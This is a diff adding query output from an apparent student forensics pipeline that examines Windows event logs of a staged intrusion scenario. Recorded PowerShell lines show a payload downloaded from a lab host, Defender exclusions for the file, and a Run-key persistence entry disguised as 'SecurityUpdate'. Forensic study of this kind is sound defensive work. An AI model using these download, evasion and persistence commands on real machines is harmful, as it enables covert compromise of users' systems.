@@ -1,0 +1,396 @@
+===== QUERY: EID 4720 and 4726 in clean_b Security.evtx =====
+EID=4720 EventRecordID=33 TimeCreated=2026-06-20T23:41:33.944938Z SubjectUserName=MINWINPC$ TargetUserName=WDAGUtilityAccount
+EID=4720 EventRecordID=142 TimeCreated=2026-06-20T13:43:25.264433Z SubjectUserName=WINDOWS10$ TargetUserName=Youssef
+EID=4720 EventRecordID=1498 TimeCreated=2026-08-12T11:41:24.841496Z SubjectUserName=Youssef TargetUserName=janed
+EID=4720 EventRecordID=1530 TimeCreated=2026-08-12T11:42:53.658236Z SubjectUserName=Youssef TargetUserName=admin_local
+EID=4720 EventRecordID=15707 TimeCreated=2026-08-24T18:44:37.368349Z SubjectUserName=admin_local TargetUserName=testuser
+EID=4726 EventRecordID=15720 TimeCreated=2026-08-24T18:45:13.362143Z SubjectUserName=admin_local TargetUserName=testuser
+
+===== QUERY: EID 4616 count and TimeCreated inversions (ordered by EventRecordID) =====
+EID_4616_count=25
+inversion_count=26
+largest_inversion EventRecordID 139 -> 140 TimeCreated 2026-06-20T23:43:18.924194Z -> 2026-06-20T13:43:25.243533Z delta=9:59:53.680661
+all_inversions:
+  139->140  2026-06-20T23:43:18.924194Z -> 2026-06-20T13:43:25.243533Z  delta=9:59:53.680661
+  512->513  2026-06-20T14:13:37.418317Z -> 2026-06-20T14:13:28.264985Z  delta=0:00:09.153332
+  857->858  2026-06-20T16:36:10.164354Z -> 2026-06-20T16:35:48.397679Z  delta=0:00:21.766675
+  966->967  2026-06-20T16:39:05.352767Z -> 2026-06-20T16:38:59.501423Z  delta=0:00:05.851344
+  1089->1090  2026-08-12T11:26:32.869172Z -> 2026-08-12T11:26:12.293887Z  delta=0:00:20.575285
+  1338->1339  2026-08-12T11:38:34.256415Z -> 2026-08-12T11:38:21.498060Z  delta=0:00:12.758355
+  3044->3045  2026-08-12T13:38:06.276159Z -> 2026-08-12T13:20:28.772136Z  delta=0:17:37.504023
+  4804->4805  2026-08-12T14:20:01.473828Z -> 2026-08-12T14:11:06.708380Z  delta=0:08:54.765448
+  4966->4967  2026-08-12T15:03:13.594531Z -> 2026-08-12T15:00:44.968832Z  delta=0:02:28.625699
+  5945->5946  2026-08-12T18:18:14.635189Z -> 2026-08-12T18:12:40.494232Z  delta=0:05:34.140957
+  6059->6060  2026-08-12T20:00:09.116912Z -> 2026-08-12T19:32:09.965365Z  delta=0:27:59.151547
+  6063->6064  2026-08-12T19:32:10.781736Z -> 2026-08-12T19:30:23.661747Z  delta=0:01:47.119989
+  8016->8017  2026-08-13T18:02:03.151145Z -> 2026-08-13T17:55:50.495963Z  delta=0:06:12.655182
+  8190->8191  2026-08-13T20:12:26.901301Z -> 2026-08-13T19:53:29.127475Z  delta=0:18:57.773826
+  8275->8276  2026-08-13T20:22:08.932350Z -> 2026-08-13T20:00:23.102108Z  delta=0:21:45.830242
+  8440->8441  2026-08-13T21:42:00.405753Z -> 2026-08-13T20:55:18.971540Z  delta=0:46:41.434213
+  8495->8496  2026-08-13T21:27:50.359263Z -> 2026-08-13T20:58:58.765894Z  delta=0:28:51.593369
+  8569->8570  2026-08-13T21:54:21.386654Z -> 2026-08-13T21:48:57.356213Z  delta=0:05:24.030441
+  8656->8657  2026-08-13T23:14:44.864833Z -> 2026-08-13T23:00:37.415525Z  delta=0:14:07.449308
+  9657->9658  2026-08-17T08:34:14.667717Z -> 2026-08-17T08:28:00.674388Z  delta=0:06:13.993329
+  11218->11219  2026-08-17T17:03:17.050208Z -> 2026-08-17T17:03:16.074045Z  delta=0:00:00.976163
+  11680->11681  2026-08-17T18:28:35.340963Z -> 2026-08-17T18:28:25.220913Z  delta=0:00:10.120050
+  12177->12178  2026-08-17T18:48:25.074147Z -> 2026-08-17T18:44:05.201297Z  delta=0:04:19.872850
+  12535->12536  2026-08-17T19:33:28.992825Z -> 2026-08-17T19:00:13.980865Z  delta=0:33:15.011960
+  12640->12641  2026-08-18T19:10:56.064841Z -> 2026-08-18T19:10:46.140497Z  delta=0:00:09.924344
+  13625->13626  2026-08-19T18:54:04.781396Z -> 2026-08-19T18:53:48.722719Z  delta=0:00:16.058677
+
+===== QUERY: largest gap between consecutive EventRecordIDs (by rid order) =====
+largest_forward_gap EventRecordID 1088 (2026-06-20T16:45:11.904447Z) -> 1089 (2026-08-12T11:26:32.869172Z) duration=52 days, 18:41:20.964725
+EventRecordID_1088 TimeCreated=2026-06-20T16:45:11.904447Z
+EventRecordID_1089 TimeCreated=2026-08-12T11:26:32.869172Z
+gap_1088_to_1089=52 days, 18:41:20.964725
+
+===== QUERY: record split at EventRecordID 1088/1089 =====
+total_records=15897
+first EventRecordID=1 TimeCreated=2026-06-20T23:41:30.958795Z
+last EventRecordID=15897 TimeCreated=2026-08-24T18:57:42.628249Z
+records_1_to_1088=1088
+records_1089_to_last=14809
+percent_1089_to_last=93.2
+
+===== QUERY: EID 4624 TargetUserName=janed in clean_b Security.evtx =====
+EventRecordID=10603 TimeCreated=2026-08-17T16:43:01.067638Z LogonType=2 TargetUserName=janed IpAddress=127.0.0.1
+count=1
+LogonType_counts={'2': 1}
+
+===== QUERY: distinct System/Computer values =====
+clean_b Security:
+  Computer=windows10 count=15791
+  Computer=WIN-BQVKLIBL3LA count=106
+clean_b System:
+  Computer=windows10 count=1742
+  Computer=WIN-BQVKLIBL3LA count=138
+scenario1 Security:
+  Computer=windows10 count=584
+
+===== QUERIES RUN 2026-08-26 (documentation provenance) =====
+Re-run on the host against collections/, not pasted from memory.
+Interpreter: .venv python 3.13.2, evtx==0.12.1
+QUERY_DATE_UTC=2026-08-26
+interpreter=3.13.2
+
+===== QUERY: KAPE 4688 records for all three collections (EventRecordID 15461, 15887, 15890, 28674, 28777, 28784 and 7z at 15780) =====
+--- collection_clean_a c:\Joseph (university)\Usal Uni\3rd summer\FYP\dfir-triage-pipeline\collections\collection_clean_a\C\Windows\System32\winevt\logs\Security.evtx ---
+EID=4688 EventRecordID=15461 TimeCreated=2026-08-24T17:21:00.773737Z SubjectUserName='admin_local' NewProcessName='\\Device\\HarddiskVolume2\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource C: --target KapeTriage --tdest Z:\\collection_clean_a'
+found=[15461] missing=[]
+--- collection_clean_b c:\Joseph (university)\Usal Uni\3rd summer\FYP\dfir-triage-pipeline\collections\collection_clean_b\C\Windows\System32\winevt\logs\Security.evtx ---
+EID=4688 EventRecordID=15780 TimeCreated=2026-08-24T18:48:15.458326Z SubjectUserName='admin_local' NewProcessName='C:\\Users\\admin_local\\Downloads\\7z2602-x64.exe' CommandLine='"C:\\Users\\admin_local\\Downloads\\7z2602-x64.exe" '
+EID=4688 EventRecordID=15887 TimeCreated=2026-08-24T18:56:13.817642Z SubjectUserName='admin_local' NewProcessName='\\Device\\HarddiskVolume2\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource C: --target --tdest Z:\\collection_clean_b'
+EID=4688 EventRecordID=15890 TimeCreated=2026-08-24T18:56:49.415002Z SubjectUserName='admin_local' NewProcessName='\\Device\\HarddiskVolume2\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource C: --target KapeTriage --tdest Z:\\collection_clean_b'
+found=[15780, 15887, 15890] missing=[]
+--- collection_s1_v2 c:\Joseph (university)\Usal Uni\3rd summer\FYP\dfir-triage-pipeline\collections\collection_s1_v2\C\Windows\System32\winevt\logs\Security.evtx ---
+EID=4688 EventRecordID=28674 TimeCreated=2026-08-23T23:19:36.095131Z SubjectUserName='admin_local' NewProcessName='Z:\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource Z: --target KapeTriage --tdest Z:\\collection_s1_v2'
+EID=4688 EventRecordID=28777 TimeCreated=2026-08-23T23:30:40.983226Z SubjectUserName='admin_local' NewProcessName='Z:\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource C: --target KapeTriage --tdest Z:\\collection_s1_v2'
+EID=4688 EventRecordID=28784 TimeCreated=2026-08-23T23:31:48.536586Z SubjectUserName='admin_local' NewProcessName='Z:\\kape\\KAPE\\kape.exe' CommandLine='"Z:\\kape\\KAPE\\kape.exe" --tsource C: --target KapeTriage --tdest Z:\\collection_s1_v2'
+found=[28674, 28777, 28784] missing=[]
+
+===== QUERY: Defender 5007 exclusion record and Quick Scan 1000/1001 pair =====
+file=c:\Joseph (university)\Usal Uni\3rd summer\FYP\dfir-triage-pipeline\collections\collection_s1_v2\C\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx
+exists=True
+EID=1000 EventRecordID=88 TimeCreated=2026-08-12T12:08:43.962013Z Product Name='%%827' | Product Version='4.18.1909.6' | Scan ID='{9F457613-F984-4E03-96B0-CB1F502B65A9}' | Scan Type Index='1' | Scan Type='%%802' | Scan Parameters Index='1' | Scan Parameters='%%806' | Domain='NT AUTHORITY' | User='NETWORK SERVICE' | SID='S-1-5-20' | Scan Resources=''
+EID=1001 EventRecordID=89 TimeCreated=2026-08-12T12:10:23.283288Z Product Name='%%827' | Product Version='4.18.1909.6' | Scan ID='{9F457613-F984-4E03-96B0-CB1F502B65A9}' | Scan Type Index='1' | Scan Type='%%802' | Scan Parameters Index='1' | Scan Parameters='%%806' | Domain='NT AUTHORITY' | User='NETWORK SERVICE' | SID='S-1-5-20' | Scan Time Hours='0' | Scan Time Minutes='01' | Scan Time Seconds='39'
+EID=5007 EventRecordID=171 TimeCreated=2026-08-12T12:20:05.024769Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='Default\\Features\\TPExclusions = 0x0' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TPExclusions = 0x0'
+EID=5007 EventRecordID=362 TimeCreated=2026-08-12T12:20:22.449093Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\EcsConfigs\\MpFC_EnableTPExclusionsSCCMNonMDEAttach = 0x1'
+EID=1000 EventRecordID=379 TimeCreated=2026-08-12T12:43:59.389690Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{8675E41C-F220-4249-9DFA-516CDF31A7F4}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1001 EventRecordID=380 TimeCreated=2026-08-12T12:45:43.337084Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{8675E41C-F220-4249-9DFA-516CDF31A7F4}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Time Hours='0' | Scan Time Minutes='01' | Scan Time Seconds='43'
+EID=1000 EventRecordID=387 TimeCreated=2026-08-12T13:55:56.265511Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{4613334A-70A5-4611-8354-138EC0D24101}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=423 TimeCreated=2026-08-13T15:10:41.415525Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{2D52EE48-A738-46A0-82A3-E81F1531B599}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1001 EventRecordID=424 TimeCreated=2026-08-13T15:22:30.770252Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{2D52EE48-A738-46A0-82A3-E81F1531B599}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Time Hours='0' | Scan Time Minutes='11' | Scan Time Seconds='49'
+EID=1000 EventRecordID=470 TimeCreated=2026-08-16T21:05:07.676303Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{FA9CEA0F-CE23-4109-83DA-39C7F4F3153B}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=626 TimeCreated=2026-08-17T18:48:24.826882Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{C18B85EE-0BFA-4CBD-86B5-8BF5C2E9F1D7}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=663 TimeCreated=2026-08-17T18:56:24.834037Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{6FA45869-56F1-4D3C-A870-6F79C3524155}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=5007 EventRecordID=718 TimeCreated=2026-08-19T18:58:52.693429Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\Z:\\kape = 0x0'
+EID=5007 EventRecordID=719 TimeCreated=2026-08-19T18:59:02.112916Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\Z:\\KapeFiles-master = 0x0'
+EID=5007 EventRecordID=785 TimeCreated=2026-08-20T15:52:33.593285Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\janed\\Downloads\\invoice_scan.exe = 0x0'
+EID=1000 EventRecordID=796 TimeCreated=2026-08-20T16:30:22.295143Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{113976AB-E1B1-4B28-A946-D7BE29E385C0}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=829 TimeCreated=2026-08-20T16:31:36.268199Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{BDF1B5C2-35FB-4478-803D-0AA9AF15BD46}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=831 TimeCreated=2026-08-20T16:33:56.426001Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{4CEA87A2-6359-4BF4-8487-15E0820B227D}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1001 EventRecordID=832 TimeCreated=2026-08-20T16:38:10.240568Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{4CEA87A2-6359-4BF4-8487-15E0820B227D}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Time Hours='0' | Scan Time Minutes='04' | Scan Time Seconds='13'
+EID=1000 EventRecordID=874 TimeCreated=2026-08-21T00:19:24.925417Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{DC26FD1E-EE9D-4067-8073-22CFAA741CD5}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='WINDOWS10' | User='janed' | SID='S-1-5-21-1654441035-1841856449-2463313859-1002' | Scan Resources='' | Scan Trigger Index='0' | Scan Trigger='Not specified' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=5007 EventRecordID=875 TimeCreated=2026-08-21T00:20:24.753465Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Old Value='' | New Value='HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\janed\\Downloads = 0x0'
+EID=1000 EventRecordID=895 TimeCreated=2026-08-21T14:42:34.320942Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{2C574F3A-EA89-49E3-A32C-B6878A3F4AB5}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=974 TimeCreated=2026-08-23T22:35:34.778165Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{C528740A-D24D-4459-81F2-DF78E56AE8F5}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1000 EventRecordID=976 TimeCreated=2026-08-23T22:46:06.442689Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{BBF5F0DE-2707-40C1-84D2-3D7B0C95F41C}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Resources='' | Scan Trigger Index='55' | Scan Trigger='Scheduled maintenance' | Scan Only If Idle='Enabled' | Low CPU Priority for Scans='Disabled' | Thread Priority='7'
+EID=1001 EventRecordID=977 TimeCreated=2026-08-23T22:47:59.072606Z Product Name='Microsoft Defender Antivirus' | Product Version='4.18.26070.9' | Scan ID='{BBF5F0DE-2707-40C1-84D2-3D7B0C95F41C}' | Scan Type Index='1' | Scan Type='Antimalware' | Scan Parameters Index='1' | Scan Parameters='Quick Scan' | Domain='NT AUTHORITY' | User='SYSTEM' | SID='S-1-5-18' | Scan Time Hours='0' | Scan Time Minutes='01' | Scan Time Seconds='52'
+EID_counts={'1000': 14, '1001': 5, '1002': 8, '1013': 1, '1150': 63, '1151': 63, '2000': 12, '2001': 51, '2002': 2, '2010': 87, '2011': 52, '2014': 1, '3002': 25, '3007': 2, '5004': 2, '5007': 608, '5008': 9}
+
+===== QUERY: PowerShell 4104 records mentioning invoice_scan =====
+file=c:\Joseph (university)\Usal Uni\3rd summer\FYP\dfir-triage-pipeline\collections\collection_s1_v2\C\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx
+exists=True
+EID=4104 EventRecordID=1538 TimeCreated=2026-08-23T21:53:19.074342Z
+ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile("http://192.168.50.5:8000/invoice_scan.exe", "$env:TEMP\tes.exe")
+---
+EID=4104 EventRecordID=1551 TimeCreated=2026-08-23T22:09:37.179499Z
+ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile("http://192.168.50.5:8000/invoice_scan.exe", "$env:TEMP\tes.exe")
+---
+EID=4104 EventRecordID=1557 TimeCreated=2026-08-23T22:10:02.204264Z
+ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile("http://192.168.50.2:8000/invoice_scan.exe", "$env:TEMP\tes.exe")
+---
+EID=4104 EventRecordID=1559 TimeCreated=2026-08-23T22:10:19.761106Z
+ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile("http://192.168.50.2:8000/invoice_scan.exe", "$env:TEMP\test.exe")
+---
+EID=4104 EventRecordID=1582 TimeCreated=2026-08-23T22:16:21.431813Z
+ScriptBlockText=(New-Object System.Net.WebClient).DownloadFile("http://192.168.50.2:8000/invoice_scan.exe", "$env:TEMP\test.exe")
+---
+EID=4104 EventRecordID=1597 TimeCreated=2026-08-23T22:38:27.274684Z
+ScriptBlockText=Get-Contetn C:\Users\janed\Downloads\invoice_scan.exe -Stream Zone.Identifier
+---
+EID=4104 EventRecordID=1602 TimeCreated=2026-08-23T22:38:44.710217Z
+ScriptBlockText=Get-Content C:\Users\janed\Downloads\invoice_scan.exe -Stream Zone.Identifier
+---
+EID=4104 EventRecordID=1604 TimeCreated=2026-08-23T22:59:48.314316Z
+ScriptBlockText=reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V SecurityUpdate ` /t REG_SZ /d "C:\Users\janed\Downloads\invoice_scan.exe" /f
+---
+EID=4104 EventRecordID=855 TimeCreated=2026-08-20T15:06:13.945020Z
+ScriptBlockText=Copy-Item -Path C:\Windows\notepad.exe -Destination Z:\invoice_scan.exe
+---
+EID=4104 EventRecordID=857 TimeCreated=2026-08-20T15:11:08.981377Z
+ScriptBlockText=Copy-Item -Path C:\Windows\System32\notepad.exe -Destination Z:\invoice_scan.exe
+---
+EID=4104 EventRecordID=859 TimeCreated=2026-08-20T15:11:30.735904Z
+ScriptBlockText=Test-Path Z:\invoice_scan.exe
+---
+EID=4104 EventRecordID=881 TimeCreated=2026-08-20T15:42:38.248256Z
+ScriptBlockText=Get-Item C:\Users\janed\Downloads\invoice_scan.exe | Format-List FullName, Length
+---
+EID=4104 EventRecordID=883 TimeCreated=2026-08-20T15:43:38.939321Z
+ScriptBlockText=Get-Content C:\Users\janed\Downloads\invoice_scan.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue
+---
+EID=4104 EventRecordID=885 TimeCreated=2026-08-20T15:44:06.873862Z
+ScriptBlockText=Unblock-File C:\Users\janed\Downloads\invoice_scan.exe
+---
+EID=4104 EventRecordID=887 TimeCreated=2026-08-20T15:44:42.901544Z
+ScriptBlockText=Start-Process C:\Users\janed\Downloads\invoice_scan.exe
+---
+EID=4104 EventRecordID=896 TimeCreated=2026-08-20T15:53:14.632680Z
+ScriptBlockText=& 'C:\Users\janed\AppData\Local\Temp\SDIAG_3f8169a2-69fd-4332-badb-02bd51dac4c4\RS_ProgramCompatibilityWizard.ps1' -TargetPath 'C:\Users\janed\Downloads\invoice_scan.exe' -AppName 'invoice_scan'
+---
+EID=4104 EventRecordID=909 TimeCreated=2026-08-20T16:08:26.344701Z
+ScriptBlockText=REG_SZ /d "C:\Users\janed\Downloads\invoice_scan.exe" /f
+---
+EID=4104 EventRecordID=920 TimeCreated=2026-08-20T16:13:21.702204Z
+ScriptBlockText=Add-MpPreference -ExclusionPath "C:\Users\janed\Downloads\invoice_scan.exe"
+---
+EID=4104 EventRecordID=973 TimeCreated=2026-08-20T16:15:50.666415Z
+ScriptBlockText=Get-FileHash C:\Users\janed\Downloads\invoice_scan.exe -Algorithm SHA256
+---
+EID=4104 EventRecordID=975 TimeCreated=2026-08-20T16:15:57.719739Z
+ScriptBlockText=Unblock-File C:\Users\janed\Downloads\invoice_scan.exe
+---
+EID=4104 EventRecordID=977 TimeCreated=2026-08-20T16:16:17.060437Z
+ScriptBlockText=explorer.exe C:\Users\janed\Downloads\invoice_scan.exe
+---
+EID=4104 EventRecordID=1018 TimeCreated=2026-08-20T17:21:17.085036Z
+ScriptBlockText=Copy-Item C:\Windows\System32\notepad.exe Z:\Invoice_scan.exe
+---
+EID=4104 EventRecordID=1020 TimeCreated=2026-08-20T17:21:53.881718Z
+ScriptBlockText=Copy-Item C:\Windows\System32\notepad.exe Z:\Invoice_Scan.exe
+---
+EID=4104 EventRecordID=1022 TimeCreated=2026-08-20T17:23:33.154383Z
+ScriptBlockText=Copy-Item C:\Windows\System32\notepad.exe Z:\Invoice_Scan.exe -Force
+---
+EID=4104 EventRecordID=1024 TimeCreated=2026-08-20T17:24:07.124488Z
+ScriptBlockText=(Get-Item Z:\Invoice_Scan).Length
+---
+EID=4104 EventRecordID=1030 TimeCreated=2026-08-20T17:24:19.500487Z
+ScriptBlockText=(Get-Item Z:\Invoice_Scan.exe).Length
+---
+EID=4104 EventRecordID=1038 TimeCreated=2026-08-20T18:43:29.897770Z
+ScriptBlockText=Unblock-File C:\Users\janed\Downloads\Invoice_Scan.exe
+---
+EID=4104 EventRecordID=1040 TimeCreated=2026-08-20T18:43:56.204306Z
+ScriptBlockText=explorer.exe C:\Users\janed\Downloads\Invoice_Scan.exe
+---
+EID=4104 EventRecordID=1055 TimeCreated=2026-08-20T18:46:53.833422Z
+ScriptBlockText=Add-MpPreference -ExclusionPath "C:\Users\janed\Downloads\Invoice_Scan.exe"
+---
+EID=4104 EventRecordID=1113 TimeCreated=2026-08-21T00:09:54.243531Z
+ScriptBlockText=Get-Item C:\Users\janed\Downloads\invoice_scan.exe =Stream *
+---
+EID=4104 EventRecordID=1119 TimeCreated=2026-08-21T00:10:06.204789Z
+ScriptBlockText=Get-Item C:\Users\janed\Downloads\invoice_scan.exe -Stream *
+---
+EID=4104 EventRecordID=1121 TimeCreated=2026-08-21T00:12:02.586467Z
+ScriptBlockText=Get-Item C:\Users\janed\Downloads\invoice_scan.exe -Stream Zone.Identifier
+---
+EID=4104 EventRecordID=1133 TimeCreated=2026-08-21T00:23:21.015600Z
+ScriptBlockText=.\invoice_scan.exe
+---
+EID=4104 EventRecordID=1135 TimeCreated=2026-08-21T00:27:20.223809Z
+ScriptBlockText=Get-Item .\invoice_scan.exe | Select-Object Length, LastWriteTime
+---
+EID=4104 EventRecordID=1137 TimeCreated=2026-08-21T00:28:18.784354Z
+ScriptBlockText=Get-Content .\invoice_scan.exe -Encoding Byte -TotalCount 2
+---
+EID=4104 EventRecordID=1139 TimeCreated=2026-08-21T00:29:00.768370Z
+ScriptBlockText=Test-Path "$env:LOCALAPPDATA\invoice_scan_marker.txt"
+---
+EID=4104 EventRecordID=1141 TimeCreated=2026-08-21T00:33:12.825952Z
+ScriptBlockText=Get-ChildItem C:\Windows\Prefetch -Filter "INVOICE_SCAN.EXE-*.pf" | Select-Object Name, LastWriteTime
+---
+EID=4104 EventRecordID=1143 TimeCreated=2026-08-21T00:54:09.950874Z
+ScriptBlockText=Get-FileHash .\invoice_scan.exe -Algorithm SHA256
+---
+EID=4104 EventRecordID=1145 TimeCreated=2026-08-21T01:00:43.830811Z
+ScriptBlockText=Copy-Item E:\invoice_scan.exe C:\Users\janed\Downloads\invoice_scan.exe -Force
+---
+EID=4104 EventRecordID=1149 TimeCreated=2026-08-21T01:34:07.863334Z
+ScriptBlockText=reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /t REG_SZ /d "C:\Users\janed\Downloads\invoice_scan.exe" /f
+---
+EID=4104 EventRecordID=1176 TimeCreated=2026-08-21T16:32:29.786011Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "invoice_scan.exe.pf" | Select-Object -First 10 FullName
+---
+EID=4104 EventRecordID=1178 TimeCreated=2026-08-21T16:34:34.835239Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "*INVOICE_SCAN" | Select-Object -First 10 FullName
+---
+EID=4104 EventRecordID=1180 TimeCreated=2026-08-21T16:35:00.104161Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "*invoice_scan" | Select-Object -First 10 FullName
+---
